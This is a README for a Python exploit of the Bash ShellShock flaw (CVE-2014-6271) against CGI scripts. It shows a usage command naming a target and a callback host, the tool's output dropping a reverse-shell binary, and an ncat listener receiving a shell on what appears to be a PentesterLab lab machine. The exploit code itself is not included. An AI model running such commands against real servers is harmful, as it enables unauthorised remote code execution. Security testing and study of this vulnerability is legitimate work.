# Exploit for CVE-2014-6271, Bash "ShellShock" Remote Code Execution
This is an exploit for the well known "ShellShock" vulnerability in BASH, specifically, targetting CGI scripts. You can see this code is recycled in the [MoovMisManage][MoovMisManage] exploit. The interesting/fun bit about this exploit is the dynamic ELF generation I borrowed from [bl4sty][bl4sty]'s Nagios exploit, as it saves me fucking about with reverse shell scripts - I just upload and run a simple ELF binary on the box. For what its worth, I had not planned on releasing this to the general public until the PTY shellcode was done, but it got out when I gave it to a few people, so no point keeping it to myself anymore.

## Usage  
To use, you simply specify your target site with CGI script, backconnect host, and backconnect port. The current version sends back a simple reverse/tcp shell, soon to be upgraded to use a reverse PTY shellcode that is a work in progress.

Example Use:
```
xrl:~$ python2 http_cgi_shellshock.py http://vulnerable.local/cgi-bin/status hacker.local 1337

   ▄████████    ▄█    █▄       ▄████████  ▄█        ▄█          ▄████████    ▄█    █▄     ▄██████▄   ▄████████    ▄█   ▄█▄ 
  ███    ███   ███    ███     ███    ███ ███       ███         ███    ███   ███    ███   ███    ███ ███    ███   ███ ▄███▀ 
  ███    █▀    ███    ███     ███    █▀  ███       ███         ███    █▀    ███    ███   ███    ███ ███    █▀    ███▐██▀   
  ███         ▄███▄▄▄▄███▄▄  ▄███▄▄▄     ███       ███         ███         ▄███▄▄▄▄███▄▄ ███    ███ ███         ▄█████▀    
▀███████████ ▀▀███▀▀▀▀███▀  ▀▀███▀▀▀     ███       ███       ▀███████████ ▀▀███▀▀▀▀███▀  ███    ███ ███        ▀▀█████▄    
         ███   ███    ███     ███    █▄  ███       ███                ███   ███    ███   ███    ███ ███    █▄    ███▐██▄   
   ▄█    ███   ███    ███     ███    ███ ███▌    ▄ ███▌    ▄    ▄█    ███   ███    ███   ███    ███ ███    ███   ███ ▀███▄ 
 ▄████████▀    ███    █▀      ██████████ █████▄▄██ █████▄▄██  ▄████████▀    ███    █▀     ▀██████▀  ████████▀    ███   ▀█▀ 
                                         ▀         ▀                                                             ▀         
               Bash/HTTPd ShellShock Remote Code Execution Exploit, CVE-2014-6271 Version: 20150401.1
    
{+} Dr0psh3llz!
{!} cbhost: 192.168.2.5
{!} cbport: 1337
{*} chmoddin dat bznz
{>} Triggering backconnect!

```

For a listener, just use netcat or ncat.
```
xrl:~$ ncat -vlp 1337
Ncat: Version 6.47 ( http://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 192.168.2.14.
Ncat: Connection from 192.168.2.14:33371.
id;uname -a
uid=1000(pentesterlab) gid=50(staff) groups=50(staff),100(pentesterlab)
Linux vulnerable 3.14.1-pentesterlab #1 SMP Sun Jul 6 09:16:00 EST 2014 i686 GNU/Linux
```

## Demo
If you want, check out the Asciicast.
[![asciicast](https://asciinema.org/a/18264.png)](https://asciinema.org/a/18264)

## Licence
Licenced under the [WTFPL][wtfpl]

[asciicast]: https://asciinema.org/a/18264
[wtfpl]: http://wtfpl.net/
[MoovMisManage]: https://github.com/XiphosResearch/MoovMisManage
[bl4sty]: https://twitter.com/bl4sty
